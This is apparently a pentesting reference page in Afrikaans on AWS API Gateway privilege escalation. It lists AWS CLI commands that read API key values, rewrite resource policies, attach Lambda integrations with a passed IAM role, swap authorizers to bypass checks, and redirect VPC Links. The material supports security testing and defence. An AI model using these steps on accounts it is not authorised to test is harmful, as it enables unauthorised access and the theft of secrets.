# AWS - Apigateway Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## Apigateway

Vir meer inligting sien:

{{#ref}}
../../aws-services/aws-api-gateway-enum.md
{{#endref}}

### `apigateway:POST`

Met hierdie toestemming kan jy API-sleutels genereer vir die APIs wat gekonfigureer is (per streek).
```bash
aws --region <region> apigateway create-api-key
```
**Potensiële impak:** Jy kan nie met hierdie tegniek privesc uitvoer nie, maar jy kan dalk toegang tot sensitiewe inligting kry.

### `apigateway:GET`

Met hierdie toestemming kan jy die gegenereerde API keys van die geconfigureerde APIs kry (per streek).
```bash
aws --region <region> apigateway get-api-keys
aws --region <region> apigateway get-api-key --api-key <key> --include-value
```
**Potensiële impak:** Jy kan nie met hierdie tegniek privesc uitvoer nie, maar jy kan dalk toegang tot sensitiewe inligting kry.

### `apigateway:UpdateRestApiPolicy`, `apigateway:PATCH`

Met hierdie toestemmings is dit moontlik om die resource policy van 'n API te wysig om jouself toegang te gee om dit aan te roep en potensiële toegang wat die API gateway mag hê te misbruik (soos om 'n kwesbare lambda aan te roep).
```bash
aws apigateway update-rest-api \
--rest-api-id api-id \
--patch-operations op=replace,path=/policy,value='"{\"jsonEscapedPolicyDocument\"}"'
```
**Potensiële impak:** Jy sal gewoonlik nie direk met hierdie tegniek privesc kan doen nie, maar jy kan dalk toegang tot sensitiewe inligting kry.

### `apigateway:PutIntegration`, `apigateway:CreateDeployment`, `iam:PassRole`

> [!NOTE]
> Benodig toetsing

'n aanvaller met die toestemmings `apigateway:PutIntegration`, `apigateway:CreateDeployment`, en `iam:PassRole` kan **'n nuwe integrasie by 'n bestaande API Gateway REST API voeg met 'n Lambda-funksie waaraan 'n IAM-rol gekoppel is**. Die aanvaller kan dan **die Lambda-funksie aktiveer om arbitrêre kode uit te voer en moontlik toegang tot die hulpbronne wat aan die IAM-rol gekoppel is, verkry**.
```bash
API_ID="your-api-id"
RESOURCE_ID="your-resource-id"
HTTP_METHOD="GET"
LAMBDA_FUNCTION_ARN="arn:aws:lambda:region:account-id:function:function-name"
LAMBDA_ROLE_ARN="arn:aws:iam::account-id:role/lambda-role"

# Add a new integration to the API Gateway REST API
aws apigateway put-integration --rest-api-id $API_ID --resource-id $RESOURCE_ID --http-method $HTTP_METHOD --type AWS_PROXY --integration-http-method POST --uri arn:aws:apigateway:region:lambda:path/2015-03-31/functions/$LAMBDA_FUNCTION_ARN/invocations --credentials $LAMBDA_ROLE_ARN

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Potensiële impak**: Toegang tot hulpbronne wat geassosieer is met die Lambda-funksie se IAM-rol.

### `apigateway:UpdateAuthorizer`, `apigateway:CreateDeployment`

> [!NOTE]
> Benodig toetsing

'n aanvaller met die toestemmings `apigateway:UpdateAuthorizer` en `apigateway:CreateDeployment` kan **'n bestaande API Gateway authorizer wysig** om sekuriteitskontroles te omseil of om ewekansige kode uit te voer wanneer API-versoeke gemaak word.
```bash
API_ID="your-api-id"
AUTHORIZER_ID="your-authorizer-id"
LAMBDA_FUNCTION_ARN="arn:aws:lambda:region:account-id:function:function-name"

# Update the API Gateway authorizer
aws apigateway update-authorizer --rest-api-id $API_ID --authorizer-id $AUTHORIZER_ID --authorizer-uri arn:aws:apigateway:region:lambda:path/2015-03-31/functions/$LAMBDA_FUNCTION_ARN/invocations

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Potensiële impak**: Omseiling van sekuriteitskontroles, onbevoegde toegang tot API-hulpbronne.

### `apigateway:UpdateVpcLink`

> [!NOTE]
> Benodig toetsing

'n aanvaller met die toestemming `apigateway:UpdateVpcLink` kan **'n bestaande VPC Link wysig om na 'n ander Network Load Balancer te wys, en sodoende moontlik privaat API-verkeer na onbevoegde of kwaadwillige hulpbronne omlei**.
```bash
VPC_LINK_ID="your-vpc-link-id"
NEW_NLB_ARN="arn:aws:elasticloadbalancing:region:account-id:loadbalancer/net/new-load-balancer-name/50dc6c495c0c9188"

# Update the VPC Link
aws apigateway update-vpc-link --vpc-link-id $VPC_LINK_ID --patch-operations op=replace,path=/targetArns,value="[$NEW_NLB_ARN]"
```
**Potensiële Impak**: Ongeoorloofde toegang tot privaat API-hulpbronne, afluistering of ontwrigting van API-verkeer.

{{#include ../../../../banners/hacktricks-training.md}}
